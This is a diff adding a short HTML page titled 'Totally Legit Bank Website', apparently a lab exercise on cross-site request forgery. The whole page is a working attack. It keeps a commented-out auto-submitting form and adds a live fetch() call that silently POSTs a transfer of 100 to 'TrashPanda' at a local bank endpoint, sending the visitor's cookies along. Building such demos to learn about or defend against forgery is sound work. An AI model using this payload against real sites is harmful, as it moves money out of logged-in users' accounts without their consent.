@@ -1,0 +1,21 @@
+<h1>Totally Legit Bank Website</h1>
+
+<!-- <form method="POST" action="http://127.0.0.1:8082/transfer" id="form">
+    <input name="to_user" value="TrashPanda">
+    <input name="amount" value="100">
+</form>
+
+<script>
+    document.getElementById("form").submit()
+</script> -->
+
+<script>
+    fetch("http://127.0.0.1:8082/transfer", {
+        method: "POST",
+        body: "to_user=TrashPanda&amount=100",
+        credentials: "include",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+    })
+        .then((r) => r.text())
+        .then((t) => console.log(t));
+</script>
